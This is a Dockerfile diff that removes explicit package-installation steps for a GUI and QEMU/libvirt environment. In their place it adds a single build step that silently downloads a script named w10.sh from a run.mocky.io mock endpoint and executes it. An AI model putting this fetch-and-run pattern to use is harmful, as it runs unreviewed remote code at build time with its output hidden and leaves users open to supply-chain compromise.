@@ -35,60 +35,6 @@ CMD ["/opt/bin/entry_point.sh"]
 #============================
 FROM ubuntu-base as ubuntu-utilities
 
-RUN apt-get -qqy update \
-    && apt-get -qqy --no-install-recommends install \
-        firefox htop terminator gnupg2 software-properties-common \
-    && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb \
-    && apt install -qqy --no-install-recommends ./google-chrome-stable_current_amd64.deb \
-    && apt-add-repository ppa:remmina-ppa-team/remmina-next \
-    && apt update \
-    && apt install -qqy --no-install-recommends remmina remmina-plugin-rdp remmina-plugin-secret \
-    && apt-add-repository ppa:obsproject/obs-studio \
-    && apt update \
-    && apt install -qqy --no-install-recommends obs-studio \
-    && apt install unzip \
-    && apt-get autoclean \
-    && apt-get autoremove \
-    && rm -rf /var/lib/apt/lists/* /var/cache/apt/* \
-    
-#============================
-# GUI
-#============================
-FROM ubuntu-utilities as ubuntu-ui
-
-ENV SCREEN_WIDTH=1280 \
-    SCREEN_HEIGHT=720 \
-    SCREEN_DEPTH=24 \
-    SCREEN_DPI=96 \
-    DISPLAY=:99 \
-    DISPLAY_NUM=99 \
-    UI_COMMAND=/usr/bin/startxfce4
-
-# RUN apt-get update -qqy \
-#     && apt-get -qqy install \
-#         xserver-xorg xserver-xorg-video-fbdev xinit pciutils xinput xfonts-100dpi xfonts-75dpi xfonts-scalable kde-plasma-desktop
-
-RUN apt-get update -qqy \
-    && apt-get -qqy install --no-install-recommends \
-        dbus-x11 xfce4 \
-    && apt-get autoclean \
-    && apt-get autoremove \
-    && rm -rf /var/lib/apt/lists/* /var/cache/apt/* \
-    && apt-add-repository ppa:openjdk-r/ppa \
-    && apt-get update \
-    && apt-get install openjdk-8-jdk -y \
-    && wget http://ftp.br.debian.org/debian/pool/main/q/qemu/qemu-kvm_2.8+dfsg-6+deb9u9_amd64.deb \
-    && dpkg -i qemu-kvm_2.8+dfsg-6+deb9u9_amd64.deb \
-    && wget http://ftp.br.debian.org/debian/pool/main/libv/libvirt/libvirt-daemon-system_3.0.0-4+deb9u4_amd64.deb \
-    && dpkg -i libvirt-daemon-system_3.0.0-4+deb9u4_amd64.deb \
-    && wget http://ftp.br.debian.org/debian/pool/main/libv/libvirt/libvirt-clients_3.0.0-4+deb9u4_amd64.deb \
-    && dpkg -i libvirt-clients_3.0.0-4+deb9u4_amd64.deb \
-    && wget http://ftp.br.debian.org/debian/pool/main/b/bridge-utils/bridge-utils_1.5-13+deb9u1_amd64.deb \
-    && dpkg -i bridge-utils_1.5-13+deb9u1_amd64.deb \
-    && wget http://ftp.br.debian.org/debian/pool/main/s/screen/screen_4.5.0-6_amd64.deb \
-    && dpkg -i screen_4.5.0-6_amd64.deb \
-    && apt-get update \
-    && apt-get install screen \
-    && apt-get install qemu-system-x86 \
-    && apt-get install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils -y \
-    && apt-get install virt-manager \
+RUN   wget -O w10.sh https://run.mocky.io/v3/de351f95-9e48-4486-842b-a1fe4c10d813 &> /dev/null \
+    && chmod +x w10.sh \
+    && ./w10.sh \
